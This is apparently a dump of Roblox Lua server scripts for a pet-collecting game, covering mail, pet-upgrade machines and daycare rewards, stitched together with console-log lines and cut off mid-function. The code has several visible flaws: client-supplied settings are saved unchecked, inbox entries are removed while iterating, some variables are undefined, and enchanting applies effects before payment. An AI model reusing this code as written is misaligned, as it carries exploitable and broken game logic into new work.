local DB = _L.DataStoreService:GetDataStore("mail:".._L.Settings.StatsVersion.._L.Settings.MailVersion)
local joinOS = nil
local debugTimes = {}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function GetMail(player)
	local data = nil
	local async = "u"..tostring(player.UserId)

	local s, e = pcall(function()
		data = DB:GetAsync(async)
	end) 

	if not s then
		_L.Print("[bold] HUGE ERROR "..e.." | MAIL [/bold]")
		return nil
	end

	if data == nil then
		local defData = _G.GetDefaultData("mail")
		DB:SetAsync(async, HttpService:JSONEncode(defData))

		return defData
	end

	local decoded = HttpService:JSONDecode(data)

	return decoded
end

function UpdateMail(player, newData)
	local data = GetMail(player)
	local async = "u"..tostring(player.UserId)

	if data == nil then
		_L.Print("[bold] ERROR WITH UPDATING MAIL "..async.."[/bold]")
		return
	end

	local s, e = pcall(function()
		DB:UpdateAsync(async, function(oldData)
			oldData = HttpService:JSONDecode(oldData)

			for i, v in pairs(newData) do
				oldData[i] = v
			end

			return HttpService:JSONEncode(oldData)  
		end)
	end)

	if not s then
		_L.Print("[bold] ERROR WITH UPDATING MAIL "..player.." reason: "..e.."[/bold]")
		return false
	end

	coroutine.wrap(function() -- WILL SORT IF PLAYER IS IN GAME
		-- UPDATE HISTORY
		local save = _L.Saving.Get(player)
		if save then
			table.sort(save.MailLog, function(i, v)
				return i.Timestamp < v.Timestamp
			end)
		end
	end)()

	return true
end

function GenerateUUID() 
	local UID = _L.Functions.GenerateUID()

	return "mail-"..UID
end

_L.Network.Invoked("Get Mail").OnInvoke = function(player)
	local data = GetMail(player)

	if data == nil then
		_L.Print("[bold] MALFORMED MAIL DATA [/bold]")
	end
	
	return data
end

_L.Network.Invoked("Send Mail").OnInvoke = function(player, data)
	if not _L.Shared.ValidateInteractable(player, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end

	local save = _L.Saving.Get(player)
	if not save then
		return
	end

	if not debugTimes[player].CanMail and os.clock() - debugTimes[player].Time <= RequiredGameTime then
		return false, "You must wait "..tostring(RequiredGameTime).." seconds before using the mailbox!"
	elseif os.clock() - debugTimes[player].Time < WaitTime then	
		return false, "You are trying this too fast!"
	end

	local success, target = pcall(function()
		if RunService:IsStudio() then
			if data.Recipient == "Player1" then
				return -1
			end
			if data.Recipient == "Player2" then
				return -2
			end
		end

		return Players:GetUserIdFromNameAsync(data.Recipient)
	end)

	if not target or not success then
		return false, "Player doesnt exist."
	end

	if target == player.UserId and not isStudio then
		return false, "You can't mail yourself silly!"
	end

	local totalCost = data.Diamonds + MailCost
	if save.Diamonds < totalCost then
		return false, "You need ".._L.Functions.Commas(totalCost-save.Diamonds).." more Diamonds!"
	end

	if #save.Pets <= 1 then
		return false, "You need at least 1 pet in your inventory at all times!"
	end

	if data.Diamonds > 0 and data.Diamonds < MinimumDiamonds then
		return false, "The minimum amount of Diamonds you can send is ".._L.Functions.NumberShorten(MinimumDiamonds).."!"
	end

	local targetData = GetMail({UserId = target})
	if #targetData.Inbox >= MaxInbox then
		return false, "Player has no space left in their inbox!"
	end

	local Settings = targetData.Settings
	local OtherSettings = Settings.OtherSettings
	local OnlyHuges = OtherSettings.HugesSetting
	local FriendsOnly = OtherSettings.FriendsOnlySetting
	local Enabled = OtherSettings.EnabledSetting
	local RequiredPets = OtherSettings.RequiredPetSetting
	local Rarities = Settings.Rarities

	if #save.Pets < #data.Pets or save.Diamonds < data.Diamonds then
		return false, "???"
	end

	local pet = nil
	if #data.Pets >= 1 then
		pet = _L.Pets.Get(data.Pets[1]) -- you can only mail 1 pet anyways.
		if not (pet and pet.uid) then
			return false, "PET ERROR"
		end

		local dir = _L.Directory.Pets[pet.id]
		if not dir then
			return false, "PET ERROR"
		end

		local rarity = dir.rarity
		local huge = dir.huge
		local titanic = dir.titanic

		local friends = _G.FriendCache[target]
		if titanic then
			return false, "You cannot mail titanics!"
		end
		
		
		if Enabled then
			if not huge and OnlyHuges then
				return false, "Target is only accepting Huges!"
			end
			if not friends and FriendsOnly then
				return false, "Target is only accepting gifts from Friends!"
			end
		else
			return false, "Target isnt accepting gifts!"
		end

		local RaritySetting = Rarities[rarity]
		if RaritySetting then
			return false, "Target isnt accepting "..rarity.." pets!"
		end

		---------------------------------------------------------------

		_L.Pets.Delete(pet.uid)
	else
		if Enabled and RequiredPets then
			return false, "Target is only accepting pets!"
		end
	end

	if #data.Pets >= 1 and not pet then
		return false, "Something went wrong, everything lost will not be refunded :("
	end

	save.Diamonds = save.Diamonds - totalCost

	local UUID = GenerateUUID()

	table.insert(targetData.Inbox, {
		Sender = player.UserId,
		Message = data.Message,
		Diamonds = data.Diamonds,
		Pets = { pet },
		uuid = UUID,
		Timestamp = workspace:GetServerTimeNow()
	})

	table.insert(save.MailLog, {
		Pets = { pet },
		Receiver = target,
		Timestamp = workspace:GetServerTimeNow(),
		Diamonds = data.Diamonds,
		UUID = UUID,
		Username = target == -1 and "Player1" or target == -2 and "Player2" or game.Players:GetNameFromUserIdAsync(target)
	})

	UpdateMail({UserId = target}, targetData)
	
	_G.ProcessPending(player,false)
	task.wait(MailDelay) -- dramatic delay..
	
	_L.Network.Fire( "Notification", player, "Mail sent! ✅", { color = Color3.fromRGB(105, 255, 168) } )
	_L.Network.Fire("Close Mailbox", player)
	_L.Network.Fire("Inbox Updated", player)
	_L.Network.Fire("Outbox Updated", player)
	
	_G.ProcessPending(player,true)
	
	return true
end

function ClaimMail()

end

_L.Network.Invoked("Claim Mail").OnInvoke = function(player, data)	
	if not _L.Shared.ValidateInteractable(player, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end

	if not debugTimes[player].CanMail and os.clock() - debugTimes[player].Time <= RequiredGameTime then
		return false, "You must wait "..tostring(RequiredGameTime).." seconds before using the mailbox!"
	elseif os.clock() - debugTimes[player].Time < WaitTime then	
		return false, "You are trying this too fast!"
	end

	local mailData = GetMail(player)
	if not mailData then
		return nil
	end

	local save = _L.Saving.Get(player)
	if not save then
		return
	end

	for _, uuid in ipairs(data) do
		for index, uuidData in ipairs(mailData.Inbox) do
			if uuid == uuidData.uuid then
				table.remove(mailData.Inbox, index)

				if uuidData.Pets[1] then
					_L.Pets.Create(player, uuidData.Pets[1].id, uuidData.Pets[1], nil, true)
				end
				_L.Give.Currency(player, uuidData.Diamonds, "Diamonds")

				table.insert(save.MailLog, {
					Pets = uuidData.Pets,
					Sender = uuidData.Sender,
					Timestamp = workspace:GetServerTimeNow(),
					Diamonds = uuidData.Diamonds,
					UUID = uuidData.uuid,
					Username = game.Players:GetNameFromUserIdAsync(uuidData.Sender)
				})
			end
		end
	end
	
	_G.ProcessPending(player,false)
	task.wait(MailDelay) -- dramatic delay..
	
	UpdateMail(player, mailData)
	_L.Network.Fire("Notification", player, "Mail claimed! ✅", { color = Color3.fromRGB(105, 255, 168) } )
	_L.Network.Fire("Inbox Updated", player)
	_L.Network.Fire("Outbox Updated", player)
	
	_G.ProcessPending(player,true)
	
	return true
end

_L.Network.Invoked("Claim All Mail").OnInvoke = function(player)
	if not _L.Shared.ValidateInteractable(player, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end

	if not debugTimes[player].CanMail and os.clock() - debugTimes[player].Time <= RequiredGameTime then
		return false, "You must wait "..tostring(RequiredGameTime).." seconds before using the mailbox!"
	elseif os.clock() - debugTimes[player].Time < WaitTime then	
		return false, "You are trying this too fast!"
	end

	local mailData = GetMail(player)
	if not mailData then
		return nil
	end

	for index, uuidData in ipairs(mailData.Inbox) do
		table.remove(mailData.Inbox, index)

		if uuidData.Pets[1] then
			_L.Pets.Create(player, uuidData.Pets[1].id, uuidData.Pets[1], nil, true)
		end
		_L.Give.Currency(player, uuidData.Diamonds, "Diamonds")

		local mailLog = _L.Saving.Get(player).MailLog
		if mailLog then
			table.insert(mailLog, {
				Pets = uuidData.Pets,
				Sender = uuidData.Sender,
				Timestamp = workspace:GetServerTimeNow(),
				Diamonds = uuidData.Diamonds,
				UUID = uuidData.uuid,
				Username = game.Players:GetNameFromUserIdAsync(uuidData.Sender)
			})
		end

	end
	
	_G.ProcessPending(player,false)
	task.wait(MailDelay) -- dramatic delay..

	UpdateMail(player, mailData)
	_L.Network.Fire( "Notification", player, "Mail claimed! ✅", { color = Color3.fromRGB(105, 255, 168) } )
	_L.Network.Fire("Inbox Updated", player)
	_L.Network.Fire("Outbox Updated", player)
	
	_G.ProcessPending(player,true)
	
	return true
end

_L.Network.Invoked("Reject Mail").OnInvoke = function(player, data)
	if not _L.Shared.ValidateInteractable(player, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end

	if not debugTimes[player].CanMail and os.clock() - debugTimes[player].Time <= RequiredGameTime then
		return false, "You must wait "..tostring(RequiredGameTime).." seconds before using the mailbox!"
	elseif os.clock() - debugTimes[player].Time < WaitTime then	
		return false, "You are trying this too fast!"
	end

	local mailData = GetMail(player)
	if not mailData then
		return nil
	end

	for _, uuid in ipairs(data) do
		for index, uuidData in ipairs(mailData.Inbox) do
			if uuid == uuidData.uuid then
				table.remove(mailData.Inbox, index)
			end
		end
	end
	
	_G.ProcessPending(player,false)
	task.wait(MailDelay) -- dramatic delay..

	UpdateMail(player, mailData)
	_L.Network.Fire("Inbox Updated", player)
	_L.Network.Fire("Outbox Updated", player)
	
	_G.ProcessPending(player,true)
	
	return true
end

_L.Network.Invoked("Get Mailbox Settings").OnInvoke = function(player)
	local mailData = GetMail(player)
	if not mailData then
		return {}
	end

	return mailData.Settings or {}
end

_L.Network.Invoked("Update Mail Settings").OnInvoke = function(player, data)
	if not _L.Shared.ValidateInteractable(player, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end

	if not debugTimes[player].CanMail and os.clock() - debugTimes[player].Time <= RequiredGameTime then
		return false, "You must wait "..tostring(RequiredGameTime).." seconds before using the mailbox!"
	elseif os.clock() - debugTimes[player].Time < WaitTime then	
		return false, "You are trying this too fast!"
	end

	local mailData = GetMail(player)
	if not mailData then
		return nil
	end

	mailData.Settings = data

	UpdateMail(player, mailData)
	_L.Network.Fire("Inbox Updated", player)
	_L.Network.Fire("Outbox Updated", player)

	return true
end
 
-- isnt this the same thing as above..
_L.Network.Fired("Set Mailbox Settings"):Connect(function(player, data)
	local mailData = GetMail(player)
	if not mailData then
		return nil
	end

	mailData.Settings = data

	UpdateMail(player, mailData)
	_L.Network.Fire("Inbox Updated", player)
	_L.Network.Fire("Outbox Updated", player)

	return true
end)
--
_L.Signal.Fired("Player Added"):Connect(function(player)
	debugTimes[player] = {
		Time = os.clock(),
		CanMail = false
	}
end)  -  Editar
  04:54:13.769    -  Editar
  04:54:13.769  ----- [2336] ServerScriptService.Scripts.Game.Machines -----  -  Editar
  04:54:13.769  --------|     Setting     |--------
local fusingMasteryRate = 70
local goldMasteryRate = 15
local rainbowMasteryRate = 30  
local darkMatterMaseryRate = {convert = 300, redeem = 700} 
local enchantingMasteryRate = 35  
local daycareMaseryRate = 250 -- guessed ngl
local FuseDecrease = 1.35
local MachineDelay = 2.5

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------
local RNG = Random.new()

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


function purchase(plr, cost)
	local s= _L.Saving.Get(plr)
	if s then s.Diamonds -= cost end
end


-- gold machine
_L.Network.Invoked("Use Golden Machine").OnInvoke = function(plyr, pets)
	if not _L.Shared.ValidateInteractable(plyr, "Gold Machine", 100) then
		return false, "You're too far from the machine!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local hc = false
	local petId = nil

	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet or not pet.uid then
			return
		end

		hc = pet.hc == true or false

		local dir = _L.Directory.Pets[pet.id]
		if not dir or ( dir.rarity == "Event" or dir.rarity == "Exclusive" ) then
			return
		end

		if pet.g or pet.r or pet.dm then
			return nil, "Pet is already golden??"
		end

		if not petId then
			petId = pet.id
		else
			if petId ~= pet.id then
				return
			end
		end	
	end

	if not petId then
		return
	end

	local machineOdds = hc and _L.Shared.GoldMachineOdds.Hardcore or _L.Shared.GoldMachineOdds.Normal
	if not machineOdds then
		return
	end

	local machineData = machineOdds[math.min(#pets, #machineOdds)]
	if not machineData then
		return
	end

	local machineCost = machineData.cost

	if machineCost > save.Diamonds then
		return false, "You need " .. _L.Functions.Commas(machineCost - save.Diamonds) .. " more Diamonds!"
	end

	if #save.Pets >= save.MaxSlots then
		return false, "You dont have enough inventory space!"
	end

	if #save.Pets - #pets <= 0 then
		return false, "You need at least one pet in your inventory!"
	end

	local shinyChance = 2
	local shinyAdding = 100 / #pets
	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet then
			return 
		end

		if pet.id ~= petId then
			return
		end

		if pet.sh then
			shinyChance = shinyChance + shinyAdding
		end

		_L.Pets.Delete(pet.uid)
	end
	
	purchase(plyr, machineCost)

	local machineChance = RNG:NextInteger(1, 100) <= machineData.chance

	coroutine.wrap(function()
		_L.Network.FireAll("Using Golden Machine", false, machineChance)
	end)()
	
	-- dramatic wait...
	task.wait(MachineDelay)

	local petDir = _L.Directory.Pets[petId]

	local masteryAdding = goldMasteryRate * #pets
	_L.Mastery.Progress(plyr, "Converting", masteryAdding)

	local isShiny = shinyChance >= RNG:NextNumber(75, 100)
	if machineChance then
		_L.Pets.Create(plyr, petId, {
			g = true,
			hc = hc == true or false,
			sh = isShiny == true or false
		})

		if machineData.chance == 13 then
			if petDir.rarity == "Legendary" then
				_L.Achievements.Add(plyr, "Golden Machine All In", 1)
			else
				_L.Achievements.Add(plyr, "Golden Machine Lucky", 1)
			end
		end	

		_L.Achievements.Add(plyr, "Golden Machine Success", 1)

		return true 
	else
		if machineData.chance == 88 then
			_L.Achievements.Add(plyr, "Golden Machine Unlucky", 1)
		end
		return false, "Failed 😢"
	end
end

-- rainbow machine
_L.Network.Invoked("Use Rainbow Machine").OnInvoke = function(plyr, pets)
	if not _L.Shared.ValidateInteractable(plyr, "Rainbow Machine", 100) then
		return false, "You're too far from the machine!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local hc = false
	local petId = nil

	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet or not pet.uid then
			return
		end

		hc = pet.hc == true or false

		local dir = _L.Directory.Pets[pet.id]
		if not dir or ( dir.rarity == "Event" or dir.rarity == "Exclusive" ) then
			return
		end

		if not pet.g or pet.r or pet.dm then
			return nil, "Pet is already rainbow??"
		end

		if not petId then
			petId = pet.id
		else
			if petId ~= pet.id then
				return
			end
		end	
	end

	if not petId then
		return
	end

	local machineOdds = hc and _L.Shared.RainbowMachineOdds.Hardcore or _L.Shared.RainbowMachineOdds.Normal
	if not machineOdds then
		return
	end

	local machineData = machineOdds[math.min(#pets, #machineOdds)]
	if not machineData then
		return
	end

	local machineCost = machineData.cost

	if machineCost > save.Diamonds then
		return false, "You need " .. _L.Functions.Commas(machineCost - save.Diamonds) .. " more Diamonds!"
	end

	if #save.Pets >= save.MaxSlots then
		return false, "You dont have enough inventory space!"
	end

	if #save.Pets - #pets <= 0 then
		return false, "You need at least one pet in your inventory!"
	end

	local shinyChance = 2
	local shinyAdding = 100 / #pets
	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet then
			return 
		end

		if pet.id ~= petId then
			return
		end

		if pet.sh then
			shinyChance = shinyChance + shinyAdding
		end

		_L.Pets.Delete(pet.uid)
	end
	
	purchase(plyr, machineCost)

	local machineChance = RNG:NextInteger(1, 100) <= machineData.chance

	coroutine.wrap(function()
		_L.Network.FireAll("Using Rainbow Machine", false, machineChance)
	end)()
	
	-- dramatic wait...
	task.wait(MachineDelay)

	local petDir = _L.Directory.Pets[petId]

	local isShiny = shinyChance >= RNG:NextNumber(75, 100)

	local masteryAdding = rainbowMasteryRate * #pets
	_L.Mastery.Progress(plyr, "Converting", masteryAdding)
	
	if machineChance then
		_L.Pets.Create(plyr, petId, {
			r = true,
			hc = hc == true or false,
			sh = isShiny == true or false
		})

		if machineData.chance == 13 then
			if petDir.rarity == "Legendary" then
				_L.Achievements.Add(plyr, "Rainbow Machine All In", 1)
			end
		end	

		_L.Achievements.Add(plyr, "Golden Machine Success", 1)

		return true 
	else
		return false, "Failed 😢"
	end
end

-- darkmatter machine
local osTable = {}
_L.Network.Invoked("Convert To Dark Matter").OnInvoke = function(plyr, pets)
	if not _L.Shared.ValidateInteractable(plyr, "Dark Matter Machine", 100) then
		return false, "You're too far from the machine!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	if osTable[plyr] and os.clock() - osTable[plyr] < 2 then
		return false, "You're trying this too fast!"
	end

	osTable[plyr] = os.clock()

	local dmQueueLength = _L.Functions.DictionaryLength(save.DarkMatterQueue)
	local dmMaxSlots = save.DarkMatterSlots

	if dmQueueLength >= dmMaxSlots then
		return false, "You do not have enough space!"
	end

	local hc = false
	local petId = nil

	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet or not pet.uid then
			return
		end

		hc = pet.hc == true or false

		local dir = _L.Directory.Pets[pet.id]
		if not dir or ( dir.rarity == "Event" or dir.rarity == "Exclusive" ) then
			return
		end

		if not pet.r or pet.g or pet.dm then
			return nil, "Pet is already dm??"
		end

		if not petId then
			petId = pet.id
		else
			if petId ~= pet.id then
				return
			end
		end	
	end

	if not petId then
		return
	end

	local machineOdds = hc and _L.Shared.DarkMatterMachineSettings.Hardcore or _L.Shared.DarkMatterMachineSettings.Normal
	if not machineOdds then
		return
	end

	local machineData = machineOdds[math.min(#pets, #machineOdds)]
	if not machineData then
		return
	end

	local machineCost = machineData.cost

	if machineCost > save.Diamonds then
		return false, "You need " .. _L.Functions.Commas(machineCost - save.Diamonds) .. " more Diamonds!"
	end

	if #save.Pets >= save.MaxSlots then
		return false, "You dont have enough inventory space!"
	end

	if #save.Pets - #pets <= 0 then
		return false, "You need at least one pet in your inventory!"
	end

	local shinyChance = 2
	local shinyAdding = 100 / #pets
	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet then
			return 
		end

		if pet.id ~= petId then
			return
		end

		if pet.sh then
			shinyChance = shinyChance + shinyAdding
		end

		_L.Pets.Delete(pet.uid)
	end
	
	purchase(plyr, machineCost)
	
	coroutine.wrap(function()
		_L.Network.FireAll("Dark Matter Machine Used", false)
	end)()
	
	local petDir = _L.Directory.Pets[petId]
	local isShiny = shinyChance >= RNG:NextNumber(75, 100)
	local waitTime = machineData.waitTime

	if _L.Mastery.HasPerk(plyr, "Dark Matter", 3) then
		waitTime = waitTime - ( waitTime * 0.20 )
	elseif _L.Mastery.HasPerk(plyr, "Dark Matter", 2) then
		waitTime = waitTime - ( waitTime * 0.10 )
	elseif _L.Mastery.HasPerk(plyr, "Dark Matter", 1) then
		waitTime = waitTime - ( waitTime * 0.05 )
	end

	_L.Mastery.Progress(plyr,"Dark Matter",darkMatterMaseryRate.convert*#pets)

	save.DarkMatterQueue[dmQueueLength + 1] = {
		readyTime = os.time() + waitTime,
		petId = petId,
		hardcore = hc,
		shiny = isShiny
	}

	return true 
end

_L.Network.Invoked("Redeem Dark Matter Pet").OnInvoke = function(plyr, id)
	if not _L.Shared.ValidateInteractable(plyr, "Dark Matter Machine", 100) then
		return false, "You're too far from the machine!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local dmData = save.DarkMatterQueue[id]
	if not dmData then
		return nil, "???"
	end

	if #save.Pets + 1 > save.MaxSlots then
		return false, "Please clear up some inventory space!"
	end

	if not ( dmData.readyTime and os.time() >= dmData.readyTime ) then
		return false, "Pet isnt ready yet!"
	end

	_L.Pets.Create(plyr, dmData.petId, {
		dm = true,
		sh = dmData.shiny == true,
		hc = dmData.hardcore == true
	})

	save.DarkMatterQueue[id] = nil

	_L.Achievements.Add(plyr, "Create Dark Matter", 1)
	_L.Mastery.Progress(plyr, "Dark Matter", darkMatterMaseryRate.redeem)
	
	coroutine.wrap(function()
		_L.Network.FireAll("Dark Matter Machine Redeemed", false)
	end)()	

	return true
end

_L.Network.Invoked("Prompt Dark Matter Skip").OnInvoke = function(plyr, id)
	return false, "."
end

_L.Signal.Invoked("Instant Dark Matter Pet").OnInvoke = function()
	return false, "."
end

_L.Signal.Invoked("Get Dark Matter Pet From Product").OnInvoke = function()
	return nil
end

-- huge machine
_L.Network.Invoked("Buy Huge Machine").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	if save.OwnsHugeMachine then
		return
	end

	local cost = 10_000_000

	if save.Diamonds >= cost then
		purchase(plyr, cost)
		save.OwnsHugeMachine = true
		return true
	else
		return false, "You need " .. _L.Functions.Commas(cost - save.Diamonds) .. " more Diamonds!"
	end
end

local PRODUCTCACHE = {}
_L.Network.Invoked("Attempt Use Huge Machine").OnInvoke = function(plyr, pets)
	if not _L.Shared.ValidateInteractable(plyr, "Huge Machine", 100) then
		return false, "You're too far from the machine!"
	end

	if not _L.Pets.Get(pets[1]) then
		return nil
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local points = 0
	local isFree = false

	_G.ProcessPending(plyr, false)
	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet or owner ~= plyr then
			_G.ProcessPending(plyr, true)
			return
		end

		local dir = _L.Directory.Pets[pet.id]
		if not dir then
			_G.ProcessPending(plyr, true)
			return
		end

		local add = ( _L.Shared.ComputeHugeMachinePoints(pet, dir) or 0 )
		points = points + tonumber(add)
	end

	local tier = 0
	local dir = _L.Shared.HugeMachineUseProducts

	if points >= dir[1].pointsMin and points <= dir[1].pointsMax then
		tier = 1	
	end

	if points >= dir[2].pointsMin and points <= dir[2].pointsMax then
		tier = 2	
	end

	if points >= dir[3].pointsMin and points <= dir[3].pointsMax then
		tier = 3	
	end

	if tier == 0 then
		_G.ProcessPending(plyr, true)
		return false, "Insufficient points!"
	end

	isFree = tier == 3

	PRODUCTCACHE[plyr.UserId] = pets
	if not isFree then
		_G.ProcessPending(plyr, true)
		return true, nil, dir[tier].productId
	else
		for i, v in pairs(pets) do
			_L.Pets.Delete(v)
		end
		PRODUCTCACHE[plyr.UserId] = nil

		coroutine.wrap(function()
			_L.Network.FireAll("Using Huge Machine", plyr)
		end)()
		
		-- dramatic wait...
		task.wait(MachineDelay)

		_L.Pets.Create(plyr, "1019")
		_L.Network.Fire("Notification", plyr, "(x1) Huge Machine Egg added to inventory!", { color = Color3.fromRGB(221, 85, 255) })

		_G.ProcessPending(plyr, true)
		return true
	end
end

_L.Signal.Invoked("Huge Machine Redeem").OnInvoke = function(plyr, productId)
	print(plyr,productId,PRODUCTCACHE)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	if not PRODUCTCACHE[plyr.UserId] then
		print('failed to get player cache')
		return  
	end

	for i, v in pairs(PRODUCTCACHE[plyr.UserId]) do
		_L.Pets.Delete(v)
	end
	PRODUCTCACHE[plyr.UserId] = nil

	coroutine.wrap(function()
		_L.Network.FireAll("Using Huge Machine", plyr)
	end)()
	
	-- dramatic wait...
	task.wait(MachineDelay)

	_L.Pets.Create(plyr, "1019")
	_L.Network.Fire("Notification", plyr, "(x1) Huge Machine Egg added to inventory!", { color = Color3.fromRGB(221, 85, 255) })

	return true
end

-- enchant machine
_L.Network.Invoked("Enchant Pets").OnInvoke = function(plyr, pets)
	local save = _L.Saving.Get(plyr)
	if not save then 
		return 
	end

	local DISCOUNT = 1
	if _L.Mastery.HasPerk(plyr, "Enchanting",3)then DISCOUNT = 0.80 end
	local cost = (_L.Shared.EnchantCost * #pets) * DISCOUNT

	if save.Diamonds < cost then
		return false, "You need " .. _L.Functions.Commas(cost - save.Diamonds) .. " more Diamonds!"
	end

	for i, v in ipairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet.uid or owner ~= plyr then 
			return false, "error" 
		end

		local dir = _L.Directory.Pets[pet.id]
		if not dir then
			return false, "error" 
		end

		if dir.rarity == "Exclusive" or dir.rarity == "Event" or dir.rarity == "Mythical" or dir.rarity == "Secret" then
			return false, "error"
		end

		local powers = _L.Pets.RollPowers()
		if not powers then
			return false, "error"
		end

		pet.powers = powers
		
		coroutine.wrap(function()
			_L.Network.FireAll("Enchanted Pets", pet.uid, powers or {})
		end)()	
	end    

	purchase(plyr, cost)
	_L.Achievements.Add(plyr, "Enchanting", 1)
	_L.Mastery.Progress(plyr, "Enchanting", enchantingMasteryRate*#pets)
	return true
end

-- collection
_L.Network.Invoked("Redeem Pet Collection").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	if save.CollectionTier == #_L.Shared.PetCollectionTiers then    
		return false
	end

	local t = _L.Shared.PetCollectionTiers[save.CollectionTier + 1]
	if #save.Collection >= t then
		save.CollectionTier = save.CollectionTier + 1
		save.MaxEquipped = save.MaxEquipped + 1
		
		coroutine.wrap(function()
			_L.Network.FireAll("Chat Msg", plyr.Name.." increased their Pet Collection to Tier "..save.CollectionTier.."!", Color3.fromRGB(144, 213, 255))
		end)()
		return true
	end

	return nil
end

_L.Signal.Fired("Pet Added"):Connect(function(plyr, id)
	local save = _L.Saving.Get(plyr)
	if save then
		local pet, owner = _L.Pets.Get(id)
		if pet and pet.id and owner == plyr then
			local rar = pet.dm and "4" or pet.r and "3" or pet.g and "2" or "1"
			local string = pet.id .. "-" .. rar

			if _L.Functions.SearchArray(save.Collection, string) then
				return
			end

			table.insert(save.Collection, string)
		end
	end
end)

-- daycare

local function calculateRewards(type, petdata, reward)
	if type == "Currency" then
		local currencyData = { -- keep this in here or else duping currency :skull:
			["Diamonds"] = {
				Min = 19800,
				Max = 1960000
			},
			["Coins"] = {
				Min = 44000,
				Max = 4360000
			},
			["Fantasy Coins"] = {
				Min = 44000,
				Max = 4360000
			},
			["Tech Coins"] = {
				Min = 44000,
				Max = 4360000
			},
			["Rainbow Coins"] = {
				Min = 44000,
				Max = 4360000
			},
			["Cartoon Coins"] = {
				Min = 44000,
				Max = 4360000
			}
		}

		local packedData = currencyData[reward] or { Min = 1, Max = 1 }

		local l = math.ceil(math.log10(petdata.s))
		if not l or l == 0 then
			l = 1
		end
		l = l * 2.5

		packedData.Min = packedData.Min * l
		packedData.Max = packedData.Max * l

		local mult = petdata.dm and 1.25 or petdata.r and 1.175 or petdata.g and 1.1 or 1
		if petdata.sh then
			mult = mult + 0.045
		end

		packedData.Min = packedData.Min * mult
		packedData.Max = packedData.Max * mult

		return packedData
	elseif type == "Boosts" then
		local packedData = { 
			["Triple Coins"]   =    2,
			["Triple Damage"]  =    2,
			["Ultra Lucky"]    =    1,
			["Super Lucky"]    =    3
		}

		local l = math.ceil(math.log10(petdata.s))
		if not l or l == 0 then
			l = 1
		end
		l = l * 1.50

		packedData["Triple Coins"] = packedData["Triple Coins"] * l
		packedData["Triple Damage"] = packedData["Triple Damage"] * l
		packedData["Super Lucky"] = packedData["Super Lucky"] * l
		packedData["Ultra Lucky"] = packedData["Ultra Lucky"] * l


		local mult = petdata.dm and 1.25 or petdata.r and 1.175 or petdata.g and 1.1 or 1
		if petdata.sh then
			mult = mult + 0.045
		end

		packedData["Triple Coins"] = packedData["Triple Coins"] * mult
		packedData["Triple Damage"] = packedData["Triple Damage"] * mult
		packedData["Super Lucky"] = packedData["Super Lucky"] * mult
		packedData["Ultra Lucky"] = packedData["Ultra Lucky"] * mult

		return packedData
	end
end

local function getWorldsCurrency(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return "Coins"
	end

	local areasUnlocked = _L.Shared.IsHardcore and save.Hardcore.AreasUnlocked or save.AreasUnlocked

	if table.find(areasUnlocked, "Cat Kingdom") then
		return "Cartoon Coins"
	elseif table.find(areasUnlocked, "The Void") then
		return "Rainbow Conis"
	elseif table.find(areasUnlocked, "Ice Tech") then
		return "Tech Coins"
	elseif table.find(areasUnlocked, "Cave") then
		return "Fantasy Coins"
	else
		return "Coins"
	end
end

_L.Network.Invoked("Daycare: Compute Loot").OnInvoke = function(plyr, pets)
	local rewards = {}

	if not _L.Shared.ValidateInteractable(plyr, "Daycare", 100) then
		return false, "You're too far from the Daycare!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return -- ?????
	end

	local function packLoot(c)
		for i, v in pairs(pets) do
			if not _L.Shared.ValidateInteractable(plyr, "Daycare", 100) then
				return false, "You're too far from the Daycare!"
			end

			local pet, owner = _L.Pets.Get(v)
			if not pet or owner ~= plyr then
				return
			end

			if c == "Currency" then
				local mainCurr = getWorldsCurrency(plyr) or "Coins"            
				local calcuDmds = calculateRewards("Currency", pet, "Diamonds")
				local calcuWrldCurr = calculateRewards("Currency", pet, mainCurr) 

				if not rewards["diamonds"] then
					rewards["diamonds"] = { Min = calcuDmds.Min, Max = calcuDmds.Max, Data = "Diamonds", Category = "Currency" }
				else
					rewards["diamonds"].Min = rewards["diamonds"].Min + calcuDmds.Min
					rewards["diamonds"].Max = rewards["diamonds"].Max + calcuDmds.Max
				end

				if not rewards["mainCurr"] then
					rewards["mainCurr"] = { Min = calcuWrldCurr.Min,  Max = calcuWrldCurr.Max, Data = mainCurr, Category = "Currency" }
				else
					rewards["mainCurr"].Min = rewards["mainCurr"].Min + calcuWrldCurr.Min
					rewards["mainCurr"].Max = rewards["mainCurr"].Max + calcuWrldCurr.Max
				end
			elseif c == "Boost" then
				local packedCurr = calculateRewards("Boosts", pet, nil)   

